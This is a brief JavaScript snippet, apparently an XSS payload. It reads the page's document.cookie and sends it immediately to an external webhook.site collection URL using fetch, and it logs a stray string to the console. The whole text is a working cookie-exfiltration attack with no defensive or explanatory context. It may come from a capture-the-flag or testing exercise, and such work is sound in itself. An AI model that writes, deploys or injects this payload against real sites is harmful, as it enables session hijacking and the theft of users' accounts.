async function sendCookie() {
  const url = "https://webhook.site/6d960ca4-93a4-4a5d-bd78-9d7e91cc7920";
  const cookie = document.cookie;
  console.log("yamatoooo");
  await fetch(url + "/?c=" + cookie);
}
sendCookie();
